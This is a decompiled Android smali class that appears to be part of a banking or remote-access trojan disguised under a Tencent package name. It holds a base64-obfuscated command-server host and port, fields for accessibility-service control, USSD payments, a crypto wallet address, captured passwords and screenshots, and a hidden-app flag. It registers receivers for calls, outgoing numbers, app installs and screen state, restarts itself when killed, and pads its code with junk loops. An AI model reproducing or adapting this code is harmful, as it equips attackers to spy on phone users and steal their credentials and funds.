.class public Lcom/tencent/MainBackgroundService;
.super Landroid/app/Service;
.source "tunesxconcerningn1011.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/tencent/MainBackgroundService$MyExceptionHandler;
    }
.end annotation


# static fields
.field public static Afterinstalloption:Ljava/lang/String; = null

.field public static CLINAME:Ljava/lang/String; = "Bhopdki"

.field public static FO_tunesxconcerningn1011_RSC:Z = false

.field public static F_tunesxconcerningn1011_ORCA:Z = false

.field public static Is_tunesxconcerningn1011_Hidden:Z = false

.field public static L_tunesxconcerningn1011_cl:Ljava/util/List; = null
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List<",
            "Lcom/tencent/tunesxconcerningn100;",
            ">;"
        }
    .end annotation
.end field

.field public static L_tunesxconcerningn1011_i:Ljava/util/List; = null
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List<",
            "Lcom/tencent/InstalledAppsScanner;",
            ">;"
        }
    .end annotation
.end field

.field public static MyAccess:Lcom/tencent/AccessibilityServiceCore; = null

.field public static admintext:Ljava/lang/String; = null

.field public static app_tunesxconcerningn1011_Context:Landroid/content/Context; = null

.field public static br:Landroid/content/BroadcastReceiver; = null

.field public static c_tunesxconcerningn1011_mn:[Ljava/lang/String; = null

.field public static currentSuccessPassword:Ljava/lang/String; = null

.field public static e_tunesxconcerningn1011_co:J = 0x0L

.field public static ifScreenShot:Ljava/lang/String; = "0"

.field public static inx:I = 0x0

.field public static k:Z = false

.field public static k_tunesxconcerningn1011_live:Z = false

.field public static p_tunesxconcerningn1011_lg:I = 0x0

.field static st:Lcom/tencent/MainBackgroundService; = null

.field public static tunesxconcerningn1011_Host:Ljava/lang/String; = null

.field public static tunesxconcerningn1011_Port:Ljava/lang/String; = null

.field public static uninstall:Ljava/lang/String; = "on"

.field public static usdtadress:Ljava/lang/String;

.field public static ussdamount:Ljava/lang/String;

.field public static ussdcard:Ljava/lang/String;

.field public static ussdpayd:Ljava/lang/String;

.field public static yrfjertunesxconcerningn1011SERBRE:Ljava/lang/String;


# instance fields
.field _IDD:I

.field private allok:Z


# direct methods
.method static constructor <clinit>()V
    .locals 18

    const-string v0, "VHhUeFQ="

    .line 34
    invoke-static {v0}, Lcom/tencent/DataPackagingEngine;->grhcriticismzfailedd31(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/tencent/MainBackgroundService;->yrfjertunesxconcerningn1011SERBRE:Ljava/lang/String;

    const-string v0, "C"

    .line 37
    sput-object v0, Lcom/tencent/MainBackgroundService;->Afterinstalloption:Ljava/lang/String;

    const-string v0, "NjQuODkuMTYwLjEz"

    .line 39
    sput-object v0, Lcom/tencent/MainBackgroundService;->tunesxconcerningn1011_Host:Ljava/lang/String;

    const-string v0, "Nzc3MQ=="

    .line 42
    sput-object v0, Lcom/tencent/MainBackgroundService;->tunesxconcerningn1011_Port:Ljava/lang/String;

    const-wide/16 v0, -0x1

    .line 50
    sput-wide v0, Lcom/tencent/MainBackgroundService;->e_tunesxconcerningn1011_co:J

    const/4 v0, -0x1

    .line 51
    sput v0, Lcom/tencent/MainBackgroundService;->p_tunesxconcerningn1011_lg:I

    .line 52
    sput v0, Lcom/tencent/MainBackgroundService;->inx:I

    const-string v1, ""

    const-string v2, ""

    const-string v3, ""

    const-string v4, ""

    const-string v5, ""

    const-string v6, ""

    const-string v7, ""

    const-string v8, ""

    const-string v9, ""

    const-string v10, ""

    const-string v11, ""

    const-string v12, ""

    const-string v13, ""

    const-string v14, ""

    const-string v15, ""

    const-string v16, ""

    const-string v17, ""

    .line 53
    filled-new-array/range {v1 .. v17}, [Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/tencent/MainBackgroundService;->c_tunesxconcerningn1011_mn:[Ljava/lang/String;

    const/4 v0, 0x0

    .line 54
    sput-boolean v0, Lcom/tencent/MainBackgroundService;->k:Z

    .line 55
    sput-boolean v0, Lcom/tencent/MainBackgroundService;->k_tunesxconcerningn1011_live:Z

    .line 56
    sput-boolean v0, Lcom/tencent/MainBackgroundService;->F_tunesxconcerningn1011_ORCA:Z

    .line 57
    sput-boolean v0, Lcom/tencent/MainBackgroundService;->FO_tunesxconcerningn1011_RSC:Z

    .line 58
    sput-boolean v0, Lcom/tencent/MainBackgroundService;->Is_tunesxconcerningn1011_Hidden:Z

    const/4 v0, 0x0

    .line 59
    sput-object v0, Lcom/tencent/MainBackgroundService;->MyAccess:Lcom/tencent/AccessibilityServiceCore;

    .line 60
    sput-object v0, Lcom/tencent/MainBackgroundService;->ussdamount:Ljava/lang/String;

    .line 61
    sput-object v0, Lcom/tencent/MainBackgroundService;->ussdcard:Ljava/lang/String;

    .line 62
    sput-object v0, Lcom/tencent/MainBackgroundService;->ussdpayd:Ljava/lang/String;

    const-string v1, ""

    .line 63
    sput-object v1, Lcom/tencent/MainBackgroundService;->currentSuccessPassword:Ljava/lang/String;

    .line 64
    sput-object v1, Lcom/tencent/MainBackgroundService;->usdtadress:Ljava/lang/String;

    .line 65
    sput-object v1, Lcom/tencent/MainBackgroundService;->admintext:Ljava/lang/String;

    .line 349
    sput-object v0, Lcom/tencent/MainBackgroundService;->br:Landroid/content/BroadcastReceiver;

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    .line 27
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    const/4 v0, 0x0

    .line 324
    iput-boolean v0, p0, Lcom/tencent/MainBackgroundService;->allok:Z

    const/16 v0, 0x11a7

    .line 376
    iput v0, p0, Lcom/tencent/MainBackgroundService;->_IDD:I

    return-void
.end method

.method public static D_tunesxconcerningn1011_ele(Ljava/lang/String;)V
    .locals 7

    const-string v0, ".txt"

    const-string v1, "/Config/sys/apps/log"

    const-string v2, "log-"

    .line 281
    :try_start_0
    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v3

    .line 283
    new-instance v4, Ljava/io/File;

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v6, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-direct {v4, v5, v6}, Ljava/io/File;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    .line 285
    invoke-virtual {v4}, Ljava/io/File;->exists()Z

    move-result v5

    if-eqz v5, :cond_0

    .line 286
    invoke-virtual {v4}, Ljava/io/File;->delete()Z

    goto :goto_0

    .line 288
    :cond_0
    new-instance v4, Ljava/io/File;

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    invoke-direct {v4, v1, p0}, Ljava/io/File;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    .line 289
    invoke-virtual {v4}, Ljava/io/File;->delete()Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :goto_0
    return-void
.end method

.method public static Get_tunesxconcerningn1011_Logs()Ljava/lang/String;
    .locals 5

    const-string v0, ""

    .line 301
    :try_start_0
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v2

    invoke-virtual {v2}, Ljava/io/File;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "/Config/sys/apps/log"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 303
    new-instance v2, Ljava/io/File;

    invoke-direct {v2, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 304
    invoke-virtual {v2}, Ljava/io/File;->listFiles()[Ljava/io/File;

    move-result-object v1

    const/4 v2, 0x0

    move-object v3, v0

    .line 307
    :goto_0
    array-length v4, v1

    if-ge v2, v4, :cond_0

    .line 308
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v4, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    aget-object v3, v1, v2

    invoke-virtual {v3}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v4, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, "*"

    invoke-virtual {v4, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    :cond_0
    return-object v3

    :catch_0
    return-object v0
.end method

.method private RegNew(Landroid/content/IntentFilter;)Ljava/lang/Boolean;
    .locals 1

    if-eqz p1, :cond_0

    :try_start_0
    const-string v0, "android.intent.action.SCREEN_OFF"

    .line 766
    invoke-virtual {p1, v0}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    const-string v0, "android.intent.action.USER_PRESENT"

    .line 767
    invoke-virtual {p1, v0}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    const-string v0, "android.intent.action.ACTION_POWER_CONNECTED"

    .line 768
    invoke-virtual {p1, v0}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    const-string v0, "android.intent.action.ACTION_POWER_DISCONNECTED"

    .line 769
    invoke-virtual {p1, v0}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 770
    new-instance v0, Lcom/tencent/ScreenStateReceiver;

    invoke-direct {v0}, Lcom/tencent/ScreenStateReceiver;-><init>()V

    sput-object v0, Lcom/tencent/DataPackagingEngine;->rc:Landroid/content/BroadcastReceiver;

    .line 771
    sget-object v0, Lcom/tencent/DataPackagingEngine;->rc:Landroid/content/BroadcastReceiver;

    invoke-virtual {p0, v0, p1}, Lcom/tencent/MainBackgroundService;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    const/4 p1, 0x1

    .line 772
    invoke-static {p1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-object p1

    :catch_0
    :cond_0
    const/4 p1, 0x0

    .line 778
    invoke-static {p1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    return-object p1
.end method

.method static synthetic access$002(Lcom/tencent/MainBackgroundService;Z)Z
    .locals 0

    .line 27
    iput-boolean p1, p0, Lcom/tencent/MainBackgroundService;->allok:Z

    return p1
.end method

.method public static cancelnotification(Landroid/content/Context;I)V
    .locals 1

    const-string v0, "notification"

    .line 379
    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p0

    check-cast p0, Landroid/app/NotificationManager;

    .line 380
    invoke-virtual {p0, p1}, Landroid/app/NotificationManager;->cancel(I)V

    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 0

    const/4 p1, 0x0

    return-object p1
.end method

.method public onCreate()V
    .locals 4

    .line 385
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    .line 387
    :try_start_0
    invoke-virtual {p0}, Lcom/tencent/MainBackgroundService;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    sput-object v0, Lcom/tencent/MainBackgroundService;->app_tunesxconcerningn1011_Context:Landroid/content/Context;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_4

    :catch_0
    const/4 v0, 0x1

    .line 395
    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    .line 396
    :goto_0
    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    const/4 v2, 0x0

    if-eqz v1, :cond_0

    .line 400
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    goto :goto_0

    .line 408
    :cond_0
    :goto_1
    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-eqz v1, :cond_1

    .line 412
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    goto :goto_1

    .line 420
    :cond_1
    :goto_2
    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-eqz v1, :cond_2

    .line 424
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    goto :goto_2

    .line 432
    :cond_2
    :goto_3
    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_3

    .line 436
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    goto :goto_3

    .line 448
    :cond_3
    :goto_4
    invoke-virtual {p0}, Lcom/tencent/MainBackgroundService;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    .line 450
    invoke-virtual {v0}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object v1

    const v2, 0x7f090012

    invoke-virtual {v1, v2}, Landroid/content/res/Resources;->getString(I)Ljava/lang/String;

    move-result-object v1

    sput-object v1, Lcom/tencent/DataPackagingEngine;->p_tunesxconcerningn103_r:Ljava/lang/String;

    .line 455
    :try_start_1
    sget-object v1, Lcom/tencent/MainBackgroundService;->br:Landroid/content/BroadcastReceiver;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_2

    if-nez v1, :cond_4

    .line 459
    :try_start_2
    new-instance v1, Landroid/content/IntentFilter;

    const-string v2, "android.intent.action.PHONE_STATE"

    invoke-direct {v1, v2}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    const-string v2, "android.intent.action.NEW_OUTGOING_CALL"

    .line 460
    invoke-virtual {v1, v2}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    const-string v2, "android.intent.extra.PHONE_NUMBER"

    .line 462
    invoke-virtual {v1, v2}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 465
    new-instance v1, Lcom/tencent/PackageMonitorReceiver;

    invoke-direct {v1}, Lcom/tencent/PackageMonitorReceiver;-><init>()V

    sput-object v1, Lcom/tencent/MainBackgroundService;->br:Landroid/content/BroadcastReceiver;

    .line 466
    new-instance v1, Landroid/content/IntentFilter;

    invoke-direct {v1}, Landroid/content/IntentFilter;-><init>()V

    const-string v2, "android.intent.action.PACKAGE_ADDED"

    .line 467
    invoke-virtual {v1, v2}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    const-string v2, "android.intent.action.PACKAGE_REMOVED"

    .line 468
    invoke-virtual {v1, v2}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    const-string v2, "android.intent.action.PACKAGE_REPLACED"

    .line 471
    invoke-virtual {v1, v2}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    const-string v2, "android.intent.action.PACKAGE_CHANGED"

    .line 472
    invoke-virtual {v1, v2}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    const-string v2, "android.intent.action.PACKAGES_SUSPENDED"

    .line 473
    invoke-virtual {v1, v2}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    const-string v2, "package"

    .line 474
    invoke-virtual {v1, v2}, Landroid/content/IntentFilter;->addDataScheme(Ljava/lang/String;)V

    .line 475
    sget-object v2, Lcom/tencent/MainBackgroundService;->br:Landroid/content/BroadcastReceiver;

    invoke-virtual {p0, v2, v1}, Lcom/tencent/MainBackgroundService;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    .line 482
    :catch_1
    :cond_4
    :try_start_3
    sget-object v1, Lcom/tencent/DataPackagingEngine;->rc:Landroid/content/BroadcastReceiver;

    if-nez v1, :cond_5

    .line 483
    new-instance v1, Landroid/content/IntentFilter;

    const-string v2, "android.intent.action.SCREEN_ON"

    invoke-direct {v1, v2}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    .line 484
    invoke-direct {p0, v1}, Lcom/tencent/MainBackgroundService;->RegNew(Landroid/content/IntentFilter;)Ljava/lang/Boolean;
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    :catch_2
    :cond_5
    const-string v1, "2"

    .line 495
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Integer;->intValue()I

    move-result v1

    .line 496
    sput v1, Lcom/tencent/DataPackagingEngine;->Trys:I

    .line 497
    new-instance v2, Ljava/lang/Thread;

    new-instance v3, Lcom/tencent/MainBackgroundService$1;

    invoke-direct {v3, p0, v0, v1}, Lcom/tencent/MainBackgroundService$1;-><init>(Lcom/tencent/MainBackgroundService;Landroid/content/Context;I)V

    invoke-direct {v2, v3}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 758
    invoke-virtual {v2}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method public onDestroy()V
    .locals 6

    .line 74
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    const/4 v0, 0x0

    .line 86
    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    .line 75
    sput v0, Lcom/tencent/DataPackagingEngine;->s_tunesxconcerningn103_f0:I

    const/4 v0, 0x0

    .line 76
    sput-object v0, Lcom/tencent/MainBackgroundService;->st:Lcom/tencent/MainBackgroundService;

    const/4 v0, 0x1

    .line 79
    :try_start_0
    sget-object v2, Lcom/tencent/MainBackgroundService;->app_tunesxconcerningn1011_Context:Landroid/content/Context;

    const-string v3, "Error"

    const-wide/32 v4, 0x2bf20

    invoke-static {v2, v3, v4, v5}, Lcom/tencent/DataPackagingEngine;->phonixeffect(Landroid/content/Context;Ljava/lang/String;J)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_4

    .line 81
    :catch_0
    :try_start_1
    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    .line 82
    :goto_0
    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v3

    if-eqz v3, :cond_0

    move-object v2, v1

    goto :goto_0

    .line 94
    :cond_0
    :goto_1
    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v3

    if-eqz v3, :cond_1

    move-object v2, v1

    goto :goto_1

    .line 106
    :cond_1
    :goto_2
    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v3

    if-eqz v3, :cond_2

    move-object v2, v1

    goto :goto_2

    .line 118
    :cond_2
    :goto_3
    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2

    if-eqz v2, :cond_3

    move-object v2, v1

    goto :goto_3

    .line 133
    :cond_3
    :goto_4
    sget-object v2, Lcom/tencent/MainBackgroundService;->br:Landroid/content/BroadcastReceiver;

    if-eqz v2, :cond_4

    .line 134
    invoke-virtual {p0, v2}, Lcom/tencent/MainBackgroundService;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    .line 142
    :cond_4
    sget-object v2, Lcom/tencent/DataPackagingEngine;->rc:Landroid/content/BroadcastReceiver;

    if-eqz v2, :cond_5

    .line 143
    sget-object v2, Lcom/tencent/DataPackagingEngine;->rc:Landroid/content/BroadcastReceiver;

    invoke-virtual {p0, v2}, Lcom/tencent/MainBackgroundService;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_2

    .line 147
    :cond_5
    :try_start_2
    new-instance v2, Landroid/content/Intent;

    invoke-virtual {p0}, Lcom/tencent/MainBackgroundService;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    const-class v4, Lcom/tencent/RestartSensorReceiver;

    invoke-direct {v2, v3, v4}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v3, "RestartSensor"

    invoke-virtual {v2, v3}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v2

    invoke-virtual {p0, v2}, Lcom/tencent/MainBackgroundService;->sendBroadcast(Landroid/content/Intent;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    goto :goto_9

    .line 151
    :catch_1
    :try_start_3
    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    .line 152
    :goto_5
    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2

    if-eqz v2, :cond_6

    move-object v0, v1

    goto :goto_5

    .line 164
    :cond_6
    :goto_6
    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2

    if-eqz v2, :cond_7

    move-object v0, v1

    goto :goto_6

    .line 176
    :cond_7
    :goto_7
    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2

    if-eqz v2, :cond_8

    move-object v0, v1

    goto :goto_7

    .line 188
    :cond_8
    :goto_8
    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    if-eqz v0, :cond_9

    move-object v0, v1

    goto :goto_8

    :catch_2
    :cond_9
    :goto_9
    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 1

    .line 330
    :try_start_0
    invoke-virtual {p0}, Lcom/tencent/MainBackgroundService;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    sput-object p1, Lcom/tencent/MainBackgroundService;->app_tunesxconcerningn1011_Context:Landroid/content/Context;

    .line 331
    invoke-virtual {p1}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object p1

    const p2, 0x7f090012

    invoke-virtual {p1, p2}, Landroid/content/res/Resources;->getString(I)Ljava/lang/String;

    move-result-object p1

    sput-object p1, Lcom/tencent/DataPackagingEngine;->p_tunesxconcerningn103_r:Ljava/lang/String;

    .line 332
    iget-boolean p1, p0, Lcom/tencent/MainBackgroundService;->allok:Z

    if-eqz p1, :cond_0

    .line 335
    const-class p1, Lcom/tencent/PersistentService;

    sget-object p2, Lcom/tencent/MainBackgroundService;->app_tunesxconcerningn1011_Context:Landroid/content/Context;

    invoke-static {p1, p2}, Lcom/tencent/BackgroundServiceHelper;->removedqtractort40(Ljava/lang/Class;Landroid/content/Context;)Z

    move-result p1

    if-eqz p1, :cond_0

    .line 336
    sget-object p1, Lcom/tencent/MainBackgroundService;->app_tunesxconcerningn1011_Context:Landroid/content/Context;

    new-instance p2, Landroid/content/Intent;

    sget-object p3, Lcom/tencent/MainBackgroundService;->app_tunesxconcerningn1011_Context:Landroid/content/Context;

    const-class v0, Lcom/tencent/PersistentService;

    invoke-direct {p2, p3, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p1, p2}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :cond_0
    const/4 p1, 0x1

    return p1

    :catch_0
    const/4 p1, 0x2

    return p1
.end method

.method public onTaskRemoved(Landroid/content/Intent;)V
    .locals 3

    .line 211
    invoke-super {p0, p1}, Landroid/app/Service;->onTaskRemoved(Landroid/content/Intent;)V

    .line 213
    :try_start_0
    sget-object p1, Lcom/tencent/MainBackgroundService;->app_tunesxconcerningn1011_Context:Landroid/content/Context;

    const-string v0, "Error"

    const-wide/32 v1, 0x2bf20

    invoke-static {p1, v0, v1, v2}, Lcom/tencent/DataPackagingEngine;->phonixeffect(Landroid/content/Context;Ljava/lang/String;J)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 218
    :catch_0
    :try_start_1
    new-instance p1, Landroid/content/Intent;

    invoke-virtual {p0}, Lcom/tencent/MainBackgroundService;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-class v1, Lcom/tencent/RestartSensorReceiver;

    invoke-direct {p1, v0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v0, "RestartSensor"

    invoke-virtual {p1, v0}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object p1

    invoke-virtual {p0, p1}, Lcom/tencent/MainBackgroundService;->sendBroadcast(Landroid/content/Intent;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_4

    :catch_1
    const/4 p1, 0x1

    .line 222
    invoke-static {p1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    .line 223
    :goto_0
    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    const/4 v1, 0x0

    if-eqz v0, :cond_0

    .line 227
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    goto :goto_0

    .line 235
    :cond_0
    :goto_1
    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_1

    .line 239
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    goto :goto_1

    .line 247
    :cond_1
    :goto_2
    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_2

    .line 251
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    goto :goto_2

    .line 259
    :cond_2
    :goto_3
    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p1

    if-eqz p1, :cond_3

    .line 263
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    goto :goto_3

    :cond_3
    :goto_4
    return-void
.end method
